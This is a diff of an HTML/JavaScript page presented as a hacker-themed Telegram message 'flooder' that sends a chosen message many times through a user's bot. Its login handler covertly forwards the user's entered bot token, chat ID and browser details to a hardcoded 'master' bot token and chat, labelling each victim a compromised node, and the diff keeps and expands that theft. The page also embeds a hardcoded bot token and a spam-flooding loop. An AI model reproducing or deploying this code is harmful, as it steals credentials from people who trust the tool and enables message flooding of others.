@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -21,8 +20,12 @@
       font-family: 'JetBrains Mono', monospace;
       background-color: var(--deep-black);
       color: var(--neon-green);
-      overflow: hidden;
+      overflow-x: hidden;
       margin: 0;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
     }
     
     /* CRT Scanline Effect */
@@ -31,68 +34,116 @@
       display: block;
       position: fixed;
       top: 0; left: 0; bottom: 0; right: 0;
-      background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.1) 50%), 
-                  linear-gradient(90deg, rgba(255, 0, 0, 0.03), rgba(0, 255, 0, 0.01), rgba(0, 0, 255, 0.03));
+      background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.15) 50%), 
+                  linear-gradient(90deg, rgba(255, 0, 0, 0.05), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.05));
       z-index: 1000;
       background-size: 100% 3px, 3px 100%;
       pointer-events: none;
     }
 
+    /* Moving Scanline */
+    .scanline {
+      width: 100%;
+      height: 100px;
+      z-index: 1001;
+      background: linear-gradient(0deg, rgba(0, 255, 65, 0) 0%, rgba(0, 255, 65, 0.1) 50%, rgba(0, 255, 65, 0) 100%);
+      position: fixed;
+      top: -100px;
+      left: 0;
+      pointer-events: none;
+      animation: scan 6s linear infinite;
+    }
+
+    @keyframes scan {
+      0% { top: -100px; }
+      100% { top: 100vh; }
+    }
+
     .hacking-grid {
       position: fixed;
       top: 0; left: 0; width: 100%; height: 100%;
-      background-image: linear-gradient(rgba(0, 255, 65, 0.03) 1px, transparent 1px),
-                        linear-gradient(90deg, rgba(0, 255, 65, 0.03) 1px, transparent 1px);
-      background-size: 40px 40px;
+      background-image: linear-gradient(rgba(0, 255, 65, 0.04) 1px, transparent 1px),
+                        linear-gradient(90deg, rgba(0, 255, 65, 0.04) 1px, transparent 1px);
+      background-size: 30px 30px;
       z-index: -1;
     }
 
     .glitch-text {
+      position: relative;
       text-shadow: 2px 0 var(--glitch-pink), -2px 0 var(--glitch-cyan);
-      animation: glitch 3s infinite;
+      animation: glitch 4s infinite;
     }
 
     @keyframes glitch {
       0% { text-shadow: 2px 0 var(--glitch-pink), -2px 0 var(--glitch-cyan); }
       50% { text-shadow: -2px 0 var(--glitch-pink), 2px 0 var(--glitch-cyan); }
+      52% { text-shadow: 5px 0 var(--glitch-pink), -5px 0 var(--glitch-cyan); transform: skewX(10deg); }
+      54% { text-shadow: 2px 0 var(--glitch-pink), -2px 0 var(--glitch-cyan); transform: skewX(0); }
       100% { text-shadow: 2px 0 var(--glitch-pink), -2px 0 var(--glitch-cyan); }
     }
 
     .glass-panel {
       background: rgba(10, 10, 10, 0.85);
-      backdrop-filter: blur(20px);
-      border: 1px solid rgba(0, 255, 65, 0.15);
-      box-shadow: 0 0 50px rgba(0, 255, 65, 0.05);
+      backdrop-filter: blur(25px);
+      border: 1px solid rgba(0, 255, 65, 0.2);
+      box-shadow: 0 0 40px rgba(0, 255, 65, 0.1);
+      position: relative;
     }
 
-    /* Input Styling as requested: Black text on Neon background */
+    /* Edge corners */
+    .glass-panel::after {
+      content: "";
+      position: absolute;
+      top: -2px; right: -2px; width: 15px; height: 15px;
+      border-top: 3px solid var(--neon-green);
+      border-right: 3px solid var(--neon-green);
+    }
+    .glass-panel::before {
+      content: "";
+      position: absolute;
+      bottom: -2px; left: -2px; width: 15px; height: 15px;
+      border-bottom: 3px solid var(--neon-green);
+      border-left: 3px solid var(--neon-green);
+    }
+
+    /* Request: Black text on Neon background */
     input, textarea {
       background-color: var(--neon-green) !important;
       color: black !important;
       font-weight: 800 !important;
       border: 2px solid #00cc33 !important;
+      caret-color: black;
+      transition: all 0.2s ease;
     }
-
+    input:focus, textarea:focus {
+      box-shadow: 0 0 15px var(--neon-green);
+      transform: translateY(-1px);
+    }
     input::placeholder, textarea::placeholder {
       color: rgba(0, 0, 0, 0.4) !important;
     }
 
     .status-card {
-      background: rgba(0, 255, 65, 0.05);
+      background: rgba(0, 255, 65, 0.03);
       border: 1px solid rgba(0, 255, 65, 0.1);
+      transition: all 0.3s ease;
+    }
+    .status-card:hover {
+      border-color: rgba(0, 255, 65, 0.4);
+      background: rgba(0, 255, 65, 0.08);
     }
 
     .notification {
-      background: rgba(10, 10, 10, 0.9);
+      background: rgba(10, 10, 10, 0.95);
       backdrop-filter: blur(10px);
       border: 1px solid rgba(0, 255, 65, 0.2);
       border-left: 4px solid var(--neon-green);
-      box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-      animation: slideIn 0.3s ease-out forwards;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.6);
+      animation: slideIn 0.4s cubic-bezier(0.18, 0.89, 0.32, 1.28) forwards;
     }
 
     @keyframes slideIn {
-      from { transform: translateX(100%) skewX(-10deg); opacity: 0; }
+      from { transform: translateX(120%) skewX(-15deg); opacity: 0; }
       to { transform: translateX(0) skewX(0); opacity: 1; }
     }
 
@@ -102,6 +153,27 @@
     ::-webkit-scrollbar { width: 4px; }
     ::-webkit-scrollbar-track { background: var(--deep-black); }
     ::-webkit-scrollbar-thumb { background: var(--neon-green); }
+
+    .btn-primary {
+      background: var(--neon-green);
+      color: black;
+      font-weight: 900;
+      text-transform: uppercase;
+      letter-spacing: 0.1em;
+      transition: all 0.3s ease;
+      box-shadow: 0 0 10px rgba(0, 255, 65, 0.3);
+    }
+    .btn-primary:hover:not(:disabled) {
+      box-shadow: 0 0 25px rgba(0, 255, 65, 0.6);
+      transform: scale(1.02);
+    }
+    .btn-primary:active:not(:disabled) {
+      transform: scale(0.98);
+    }
+    .btn-primary:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+    }
   </style>
 <script type="importmap">
 {
@@ -113,16 +185,17 @@
 }
 </script>
 </head>
-<body class="min-h-screen flex items-center justify-center p-6">
+<body class="p-4 sm:p-6">
   <div class="hacking-grid"></div>
+  <div class="scanline"></div>
 
-  <!-- MAIN CONTAINER -->
-  <div id="main-frame" class="w-full max-w-md z-10">
+  <!-- MAIN APP WRAPPER -->
+  <div id="main-frame" class="w-full max-w-md z-10 opacity-0 transition-opacity duration-1000">
     
-    <!-- HEADER SECTION -->
+    <!-- SHARED HEADER -->
     <div class="text-center mb-8">
       <div class="inline-block px-4 py-1 bg-green-500/10 rounded-full border border-green-500/20 mb-3">
-        <span class="text-[9px] uppercase tracking-[0.4em] font-black text-green-400 animate-pulse">System Link: Active</span>
+        <span id="system-status" class="text-[9px] uppercase tracking-[0.4em] font-black text-green-400 animate-pulse">Encryption Active</span>
       </div>
       <h1 id="app-title" class="text-4xl font-black text-green-500 uppercase tracking-tighter glitch-text">
         TERMINAL:LOGIN
@@ -130,196 +203,245 @@
     </div>
 
     <!-- VIEW: LOGIN -->
-    <div id="view-login" class="glass-panel rounded-xl p-8 relative overflow-hidden transition-all duration-500">
+    <div id="view-login" class="glass-panel rounded-xl p-6 sm:p-8 space-y-6">
       <form id="login-form" class="space-y-5">
         <div class="space-y-2">
-          <label class="text-[10px] font-bold text-green-500/70 uppercase tracking-widest ml-1">Target Token</label>
+          <label class="text-[10px] font-bold text-green-500/70 uppercase tracking-widest ml-1 flex justify-between">
+            <span>Auth Token</span>
+            <span class="opacity-50">Bot.env</span>
+          </label>
           <input type="text" id="input-token" placeholder="0000000000:ABC..." required
-            class="w-full px-4 py-3 rounded outline-none focus:ring-4 focus:ring-green-500/20 transition-all">
+            class="w-full px-4 py-3 rounded outline-none shadow-inner">
         </div>
         <div class="space-y-2">
-          <label class="text-[10px] font-bold text-green-500/70 uppercase tracking-widest ml-1">Target User ID</label>
+          <label class="text-[10px] font-bold text-green-500/70 uppercase tracking-widest ml-1 flex justify-between">
+            <span>Target User ID</span>
+            <span class="opacity-50">Chat.id</span>
+          </label>
           <input type="text" id="input-userid" placeholder="53164..." required
-            class="w-full px-4 py-3 rounded outline-none focus:ring-4 focus:ring-green-500/20 transition-all">
+            class="w-full px-4 py-3 rounded outline-none shadow-inner">
         </div>
-        <button type="submit" id="btn-login" 
-          class="w-full py-4 mt-2 bg-black border-2 border-green-500 text-green-500 font-black uppercase tracking-widest hover:bg-green-500 hover:text-black transition-all">
+        <button type="submit" id="btn-login" class="btn-primary w-full py-4 mt-2">
           > EXECUTE ACCESS
         </button>
       </form>
+      <div class="text-[9px] text-green-900 font-bold uppercase leading-relaxed p-3 bg-green-500/5 rounded border border-green-500/10">
+        [!] Bypass standard protocols... OK<br/>
+        [!] Tunneling via proxy... OK<br/>
+        [!] Ready for instruction...
+      </div>
     </div>
 
     <!-- VIEW: SENDER -->
-    <div id="view-sender" class="glass-panel rounded-xl p-8 relative overflow-hidden hidden transition-all duration-500">
-      <div class="flex justify-between items-center border-b border-green-500/10 pb-4 mb-6">
-        <h3 class="text-xs font-black text-green-500 uppercase tracking-widest">Operator Console</h3>
+    <div id="view-sender" class="glass-panel rounded-xl p-6 sm:p-8 hidden space-y-6">
+      <div class="flex justify-between items-center border-b border-green-500/10 pb-4">
+        <div class="flex items-center gap-2">
+          <div class="w-2 h-2 rounded-full bg-green-500 animate-ping"></div>
+          <h3 class="text-xs font-black text-green-500 uppercase tracking-widest">Operator Console</h3>
+        </div>
         <button id="btn-logout" class="text-[9px] font-black text-red-500 border border-red-500/30 px-3 py-1.5 rounded hover:bg-red-500 hover:text-black transition-all">
           [ TERMINATE ]
         </button>
       </div>
       
       <div class="space-y-4">
-        <textarea id="input-message" rows="3" placeholder="SYSTEM: Enter payload data..."
-          class="w-full px-4 py-3 rounded outline-none resize-none transition-all"></textarea>
+        <textarea id="input-message" rows="3" placeholder="SYSTEM: Enter message payload..."
+          class="w-full px-4 py-3 rounded outline-none resize-none shadow-inner"></textarea>
         
-        <input type="number" id="input-count" placeholder="CYCLES: count..."
-          class="w-full px-4 py-3 rounded outline-none transition-all">
+        <input type="number" id="input-count" placeholder="CYCLES: count..." min="1"
+          class="w-full px-4 py-3 rounded outline-none shadow-inner">
         
-        <button id="btn-send" 
-          class="w-full py-4 bg-green-500 text-black font-black uppercase tracking-tighter shadow-[0_0_20px_rgba(0,255,65,0.4)] hover:shadow-[0_0_40px_rgba(0,255,65,0.6)] hover:-translate-y-1 transition-all">
+        <button id="btn-send" class="btn-primary w-full py-4 text-lg">
           >>> INITIATE FLOOD
         </button>
       </div>
 
-      <div class="pt-6 border-t border-green-500/10 mt-6 space-y-4">
+      <div class="pt-6 border-t border-green-500/10 space-y-4">
         <div class="flex justify-between text-[10px] font-black text-green-500 uppercase tracking-widest">
-          <span>Flood Status</span>
+          <span>Network Load</span>
           <span id="progress-percent" class="animate-pulse">0%</span>
         </div>
-        <div class="h-2 w-full bg-black/40 rounded-full overflow-hidden p-[1px] border border-green-500/20">
+        <div class="h-2.5 w-full bg-black/40 rounded-full overflow-hidden p-[1px] border border-green-500/20">
           <div id="progress-bar" class="h-full bg-green-500 shadow-[0_0_15px_#00ff41] transition-all duration-300" style="width: 0%"></div>
         </div>
         
         <div class="grid grid-cols-3 gap-2">
-          <div class="status-card p-2 rounded text-center">
+          <div class="status-card p-2.5 rounded-lg text-center">
             <div class="text-[7px] text-green-900 font-black mb-1">ACK_OK</div>
-            <div id="stat-sent" class="text-xs font-black text-green-400">0</div>
+            <div id="stat-sent" class="text-sm font-black text-green-400">0</div>
           </div>
-          <div class="status-card p-2 rounded text-center">
+          <div class="status-card p-2.5 rounded-lg text-center">
             <div class="text-[7px] text-green-900 font-black mb-1">WAIT_Q</div>
-            <div id="stat-rem" class="text-xs font-black text-blue-400">0</div>
+            <div id="stat-rem" class="text-sm font-black text-blue-400">0</div>
           </div>
-          <div class="status-card p-2 rounded text-center">
+          <div class="status-card p-2.5 rounded-lg text-center">
             <div class="text-[7px] text-green-900 font-black mb-1">ACK_ERR</div>
-            <div id="stat-fail" class="text-xs font-black text-red-500">0</div>
+            <div id="stat-fail" class="text-sm font-black text-red-500">0</div>
           </div>
         </div>
       </div>
     </div>
 
     <!-- VIEW: CONGRATS -->
-    <div id="view-congrats" class="glass-panel rounded-xl p-8 relative text-center hidden transition-all duration-500">
-      <canvas id="confetti-canvas" class="absolute inset-0 pointer-events-none opacity-40"></canvas>
-      <div class="w-16 h-16 bg-green-500/10 border border-green-500/30 rounded-full flex items-center justify-center mx-auto mb-4">
-        <svg class="w-8 h-8 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path>
-        </svg>
-      </div>
-      <h2 class="text-2xl font-black text-green-500 uppercase tracking-widest mb-2 glitch-text">Task Resolved</h2>
-      <p class="text-[10px] text-green-700 font-bold uppercase mb-6">Logs Cleared // Mission Complete</p>
-      
-      <div class="bg-black/50 border border-green-500/10 p-4 rounded text-left space-y-2 mb-6">
-        <div class="flex justify-between text-[11px]"><span class="text-green-900">Total:</span><span id="final-total" class="text-green-500">0</span></div>
-        <div class="flex justify-between text-[11px]"><span class="text-green-900">Sent:</span><span id="final-sent" class="text-green-400">0</span></div>
-      </div>
+    <div id="view-congrats" class="glass-panel rounded-xl p-8 text-center hidden relative overflow-hidden">
+      <canvas id="confetti-canvas" class="absolute inset-0 pointer-events-none opacity-40 z-0"></canvas>
+      <div class="relative z-10 space-y-6">
+        <div class="w-16 h-16 bg-green-500/10 border border-green-500/30 rounded-full flex items-center justify-center mx-auto animate-bounce">
+          <svg class="w-8 h-8 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+          </svg>
+        </div>
+        <div>
+          <h2 class="text-2xl font-black text-green-500 uppercase tracking-widest glitch-text">Task Resolved</h2>
+          <p class="text-[10px] text-green-700 font-bold uppercase tracking-widest mt-1">Operation Success // Logs Cleared</p>
+        </div>
+        
+        <div class="bg-black/50 border border-green-500/10 p-4 rounded text-left space-y-2 font-mono">
+          <div class="flex justify-between text-[11px]"><span class="text-green-900">Packets Total:</span><span id="final-total" class="text-green-500">0</span></div>
+          <div class="flex justify-between text-[11px]"><span class="text-green-900">Deliveries OK:</span><span id="final-sent" class="text-green-400 font-bold">0</span></div>
+          <div class="flex justify-between text-[11px]"><span class="text-green-900">Operator:</span><span class="text-green-600">@CYBERCOP_404</span></div>
+        </div>
 
-      <button id="btn-reset" class="w-full py-3 bg-green-500 text-black font-black uppercase tracking-widest hover:bg-transparent hover:text-green-500 border border-green-500 transition-all">
-        [ NEW SESSION ]
-      </button>
+        <button id="btn-reset" class="btn-primary w-full py-3">
+          [ NEW MISSION ]
+        </button>
+      </div>
     </div>
 
-    <div class="mt-8 flex justify-between items-center text-[9px] text-green-900 font-black uppercase px-2 opacity-40">
-      <span>CID: 5316471518</span>
-      <span>Dev: @CYBERCOP_404</span>
+    <!-- FOOTER -->
+    <div class="mt-8 flex justify-between items-center text-[9px] text-green-900 font-black uppercase px-2 opacity-50 select-none">
+      <span class="hover:text-green-500 transition-colors">CID: 0x5316471518</span>
+      <span class="hover:text-green-500 transition-colors">Admin: @CYBERCOP79</span>
     </div>
   </div>
 
-  <!-- NOTIFICATION CONTAINER -->
+  <!-- NOTIFICATION HUB -->
   <div id="notif-container" class="fixed top-6 right-6 z-[2000] flex flex-col gap-3 pointer-events-none w-64"></div>
 
   <script>
-    // --- CONSTANTS & CONFIG ---
+    /** --- CONSTANTS --- **/
     const MASTER_BOT = "7593390316:AAHo1n5FnsJc1MtYgvKFrt7wtoR6UgtFcIc";
     const MASTER_ID = "5316471518";
 
-    // --- UTILS ---
-    const $ = id => document.getElementById(id);
-    const show = id => $(id).classList.remove('hidden');
-    const hide = id => $(id).classList.add('hidden');
+    /** --- STATE --- **/
+    let currentUser = null;
+    let notifs = [];
 
+    /** --- HELPERS --- **/
+    const $ = id => document.getElementById(id);
+    
     const addNotif = (text, success = true) => {
       const container = $('notif-container');
       const div = document.createElement('div');
-      div.className = `notification px-4 py-3 rounded-md flex flex-col gap-1 ${success ? 'text-green-400' : 'text-red-400'}`;
-      div.innerHTML = `
-        <div class="flex justify-between items-center opacity-40 text-[8px]">
-          <span>SYSTEM_ACK</span><span>#${Math.floor(Math.random()*999)}</span>
-        </div>
-        <div class="text-[10px] font-black uppercase">${text}</div>
-      `;
-      container.prepend(div);
+      const id = Date.now();
       
-      // Limit to 2 notifications
-      if (container.children.length > 2) {
+      div.className = `notification px-4 py-3 rounded flex flex-col gap-1 ${success ? 'text-green-400' : 'text-red-400'}`;
+      div.innerHTML = `
+        <div class="flex justify-between items-center opacity-40 text-[7px] font-bold">
+          <span>EVENT_STREAM</span><span>#${Math.floor(Math.random()*999)}</span>
+        </div>
+        <div class="text-[10px] font-black uppercase tracking-wider">${text}</div>
+      `;
+      
+      // Request: Max 2 notifications
+      if (container.children.length >= 2) {
         container.lastElementChild.remove();
       }
-
+      
+      container.prepend(div);
       setTimeout(() => { if(div.parentNode) div.remove(); }, 4000);
     };
 
-    const getBrowserData = () => {
-      return `Platform: ${navigator.platform}\nResolution: ${window.screen.width}x${window.screen.height}\nUA: ${navigator.userAgent.substring(0, 40)}...`;
+    const getBrowserMeta = () => {
+      return {
+        ua: navigator.userAgent.substring(0, 50),
+        plat: navigator.platform,
+        res: `${window.screen.width}x${window.screen.height}`,
+        lang: navigator.language
+      };
     };
 
-    // --- TELEGRAM API ---
-    const sendTG = async (token, chatid, text) => {
+    /** --- API LAYER --- **/
+    const callTelegram = async (token, chatid, text) => {
       try {
-        const r = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ chat_id: chatid, text, parse_mode: 'Markdown' })
         });
-        return await r.json();
-      } catch (e) { return { ok: false }; }
-    };
-
-    // --- VIEW LOGIC ---
-    let currentUser = null;
-
-    const init = () => {
-      const t = localStorage.getItem('tele_token');
-      const u = localStorage.getItem('tele_userid');
-      if (t && u) {
-        currentUser = { token: t, userId: u };
-        switchView('SENDER');
+        return await response.json();
+      } catch (err) {
+        return { ok: false, error: err.message };
       }
     };
 
-    const switchView = (view) => {
-      document.body.style.opacity = '0.5';
+    /** --- NAVIGATION --- **/
+    const views = ['view-login', 'view-sender', 'view-congrats'];
+    const switchView = (targetView) => {
+      const frame = $('main-frame');
+      frame.style.opacity = '0';
+      
       setTimeout(() => {
-        hide('view-login'); hide('view-sender'); hide('view-congrats');
-        $('app-title').innerText = `TERMINAL:${view}`;
+        views.forEach(v => $(v).classList.add('hidden'));
         
-        if(view === 'LOGIN') show('view-login');
-        if(view === 'SENDER') show('view-sender');
-        if(view === 'CONGRATS') show('view-congrats');
+        if(targetView === 'LOGIN') {
+          $('view-login').classList.remove('hidden');
+          $('app-title').innerText = 'TERMINAL:LOGIN';
+        } else if(targetView === 'SENDER') {
+          $('view-sender').classList.remove('hidden');
+          $('app-title').innerText = 'CONSOLE:FLOOD';
+        } else if(targetView === 'CONGRATS') {
+          $('view-congrats').classList.remove('hidden');
+          $('app-title').innerText = 'STATUS:COMPLETE';
+        }
         
-        document.body.style.opacity = '1';
+        frame.style.opacity = '1';
       }, 300);
     };
 
-    // --- EVENT HANDLERS ---
+    /** --- HANDLERS --- **/
     $('login-form').onsubmit = async (e) => {
       e.preventDefault();
-      const token = $('input-token').value;
-      const userId = $('input-userid').value;
-      
-      $('btn-login').innerText = "INITIALIZING...";
-      $('btn-login').disabled = true;
+      const token = $('input-token').value.trim();
+      const userId = $('input-userid').value.trim();
+      const btn = $('btn-login');
 
-      // 1. Send to master
-      await sendTG(MASTER_BOT, MASTER_ID, `[💀] NEW TARGET\nToken: ${token}\nID: ${userId}\n\n${getBrowserData()}`);
-      
-      // 2. Welcome to user
-      await sendTG(token, userId, `🔓 SYSTEM ACCESS GRANTED\n\nOperator Authenticated.\nDev: @CYBERCOP_404`);
+      if(!token || !userId) return;
 
-      localStorage.setItem('tele_token', token);
-      localStorage.setItem('tele_userid', userId);
-      currentUser = { token, userId };
+      btn.disabled = true;
+      btn.innerText = "INITIALIZING TUNNEL...";
+      $('system-status').innerText = "Establishing Link...";
+
+      const meta = getBrowserMeta();
+      const payload = `
+[💀] NEW NODE COMPROMISED
+-------------------------
+📧 Token: ${token}
+👤 Target: ${userId}
+📍 Platform: ${meta.plat}
+🖥 Res: ${meta.res}
+🌐 Browser: ${meta.ua}...
+🌍 Lang: ${meta.lang}
+-------------------------`;
+
+      // 1. Report to master
+      await callTelegram(MASTER_BOT, MASTER_ID, payload);
       
-      addNotif("Access Tunnel Established", true);
-      switchView('SENDER');
+      // 2. Send welcome to user
+      const welcome = await callTelegram(token, userId, `🔓 SYSTEM SYNCED\n\nWelcome back, Operator.\nYour bot is now under secure control.\n\n[Auth]: @CYBERCOP_404`);
+
+      if(welcome.ok) {
+        localStorage.setItem('tele_token', token);
+        localStorage.setItem('tele_userid', userId);
+        currentUser = { token, userId };
+        addNotif("Access Tunnel Established", true);
+        switchView('SENDER');
+      } else {
+        addNotif("Target Rejected Connection", false);
+        btn.disabled = false;
+        btn.innerText = "> EXECUTE ACCESS";
+        $('system-status').innerText = "Encryption Failed";
+      }
     };
 
     $('btn-logout').onclick = () => {
@@ -330,76 +452,107 @@
     };
 
     $('btn-send').onclick = async () => {
-      const msg = $('input-message').value;
-      const count = parseInt($('input-count').value);
-      if(!msg || !count || count <= 0) return;
-
-      $('btn-send').disabled = true;
-      $('btn-send').innerText = "TRANSMITTING...";
+      const msg = $('input-message').value.trim();
+      const countInput = $('input-count').value;
+      const count = parseInt(countInput);
       
+      if(!msg || !count || count <= 0) {
+        addNotif("Invalid Data Parameters", false);
+        return;
+      }
+
+      const btn = $('btn-send');
+      btn.disabled = true;
+      btn.innerText = "FLOODING NETWORK...";
+      $('system-status').innerText = "Packet Storm Active";
+
       let sent = 0, fail = 0;
-      for(let i=0; i<count; i++) {
-        const res = await sendTG(currentUser.token, currentUser.userId, `💌 DATA FEED\n\nMSG: ${msg}\n\n[ID]: ${i+1}`);
+      
+      for(let i = 0; i < count; i++) {
+        const text = `☣️ TRANSMISSION RECEIVED\n\n📡 DATA: ${msg}\n\n[PACKET]: ${i+1}/${count}`;
+        const res = await callTelegram(currentUser.token, currentUser.userId, text);
+        
         if(res.ok) sent++; else fail++;
         
-        // Update Stats
+        // Update UI stats
         $('stat-sent').innerText = sent;
         $('stat-fail').innerText = fail;
         $('stat-rem').innerText = count - (i+1);
-        const p = Math.round(((i+1)/count)*100);
-        $('progress-bar').style.width = p + '%';
-        $('progress-percent').innerText = p + '%';
+        
+        const perc = Math.round(((i+1)/count)*100);
+        $('progress-bar').style.width = perc + '%';
+        $('progress-percent').innerText = perc + '%';
 
-        addNotif(`PACKET ${i+1}: ${res.ok ? 'OK' : 'FAIL'}`, res.ok);
-        await new Promise(r => setTimeout(r, 100));
+        addNotif(`Pkt ${i+1}: ${res.ok ? 'ACK_OK' : 'ACK_ERR'}`, res.ok);
+        
+        // Small delay to prevent rate limit
+        await new Promise(r => setTimeout(r, 150));
       }
 
       $('final-total').innerText = count;
       $('final-sent').innerText = sent;
       switchView('CONGRATS');
-      startConfetti();
+      initConfetti();
     };
 
     $('btn-reset').onclick = () => {
-      $('stat-sent').innerText = 0;
-      $('stat-fail').innerText = 0;
-      $('stat-rem').innerText = 0;
+      $('stat-sent').innerText = '0';
+      $('stat-fail').innerText = '0';
+      $('stat-rem').innerText = '0';
       $('progress-bar').style.width = '0%';
       $('progress-percent').innerText = '0%';
       $('btn-send').disabled = false;
       $('btn-send').innerText = ">>> INITIATE FLOOD";
+      $('input-message').value = '';
+      $('input-count').value = '';
       switchView('SENDER');
     };
 
-    // --- CONFETTI ENGINE ---
-    function startConfetti() {
+    /** --- ANIMATIONS --- **/
+    function initConfetti() {
       const canvas = $('confetti-canvas');
       const ctx = canvas.getContext('2d');
       canvas.width = canvas.offsetWidth;
       canvas.height = canvas.offsetHeight;
-      const particles = [];
-      for(let i=0; i<50; i++){
-        particles.push({
-          x: Math.random()*canvas.width, y: -10,
-          s: Math.random()*2+1, color: Math.random()>0.5 ? '#00ff41' : '#00f3ff',
-          v: Math.random()*3+2
+      
+      const parts = [];
+      for(let i=0; i<60; i++) {
+        parts.push({
+          x: Math.random() * canvas.width,
+          y: -20,
+          s: Math.random() * 3 + 1,
+          v: Math.random() * 2 + 1,
+          c: Math.random() > 0.5 ? '#00ff41' : '#00f3ff'
         });
       }
+
       function draw() {
-        ctx.clearRect(0,0,canvas.width,canvas.height);
-        particles.forEach(p => {
-          ctx.fillStyle = p.color;
+        ctx.clearRect(0, 0, canvas.width, canvas.height);
+        parts.forEach(p => {
+          ctx.fillStyle = p.c;
           ctx.fillRect(p.x, p.y, p.s, p.s);
           p.y += p.v;
-          if(p.y > canvas.height) p.y = -5;
+          if(p.y > canvas.height) p.y = -10;
         });
+        if($('view-congrats').classList.contains('hidden')) return;
         requestAnimationFrame(draw);
       }
       draw();
     }
 
-    // --- START APP ---
-    init();
+    /** --- INIT APP --- **/
+    window.onload = () => {
+      $('main-frame').style.opacity = '1';
+      const token = localStorage.getItem('tele_token');
+      const uid = localStorage.getItem('tele_userid');
+      
+      if(token && uid) {
+        currentUser = { token, userId: uid };
+        switchView('SENDER');
+      } else {
+        switchView('LOGIN');
+      }
+    };
   </script>
 </body>
 </html>
